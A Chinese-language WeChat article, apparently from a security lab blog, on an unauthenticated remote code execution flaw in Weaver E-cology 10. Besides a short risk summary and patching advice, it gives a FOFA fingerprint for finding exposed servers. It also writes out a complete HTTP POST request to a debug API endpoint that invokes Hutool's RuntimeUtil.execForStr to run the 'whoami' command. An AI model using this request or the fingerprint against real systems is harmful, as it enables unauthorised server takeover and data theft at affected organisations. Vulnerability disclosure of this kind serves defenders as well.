---
title: 泛微 E-cology 10 未授权远程代码执行漏洞分析与安全风险解读
url: https://mp.weixin.qq.com/s/OqS-aKp03ywBJczQmq6BPA
source: Doonsec's feed
date: 2026-03-24
fetch_date: 2026-03-25T04:14:28.175998
---

# 泛微 E-cology 10 未授权远程代码执行漏洞分析与安全风险解读

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2AAMh9HmvsQWycqn8W9o6GCQPc5JuZMBeUVhwYnibYxLc9tuqSdiaRY5PVUsnmCxBDQqXd3zW24RYhVZSkfWRscyFdHPHaFIlicpmtz2SDcibrg/0?wx_fmt=jpeg)

# 泛微 E-cology 10 未授权远程代码执行漏洞分析与安全风险解读

原创

zz
zz

星络安全实验室

![]()

在小说阅读器中沉浸阅读

|  |
| --- |
| 免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责 |

fofa语法

```
icon_hash="-1619753057"
```

泛微 E-cology 10 是一款面向中大型组织的数智化协同运营平台，定位为企业级数字化中枢，核心功能涵盖协同办公、流程管理、业务集成、知识管理以及低代码开发等多种业务场景，广泛应用于企业信息化建设中。

然而，安全研究表明，该系统存在严重的远程代码执行（RCE）漏洞。攻击者在**无需身份认证**的情况下，可通过向特定接口发送精心构造的恶意请求，在目标服务器上执行任意代码。

一旦漏洞被成功利用，可能带来以下安全风险：

* 服务器被完全控制，系统权限遭到接管
* 企业敏感数据（如业务数据、用户信息等）被窃取或篡改
* 系统被植入后门程序，形成长期潜伏风险
* 内网环境进一步被横向渗透，扩大攻击影响范围

该漏洞的存在对企业信息安全构成了严重威胁，建议相关用户及时关注官方安全公告，尽快进行漏洞修复与安全加固，同时加强访问控制与日志审计机制，以降低潜在风险。

```
POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1Host: xxContent-Type: application/jsonConnection: closeSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-origin
[["whoami"]]
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AAMh9HmvsS6OOmYTTXV2KMB1JDxVrMdY1jeB5o7j5MAVTQV6uuIibMxkufHOH1otbTRdnWe0oFayD15uPljlNH2kr4rBpM8fY4A8ibkpvdU4/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVfKeM6Wy6PgZ3SzJB1dE84xX3orTjVdroVicXdKWzCJjT0ydOaEXLZDxq1tf55BhibqCmKcr6vWg04g/0?wx_fmt=png)

星络安全实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVfKeM6Wy6PgZ3SzJB1dE84xX3orTjVdroVicXdKWzCJjT0ydOaEXLZDxq1tf55BhibqCmKcr6vWg04g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过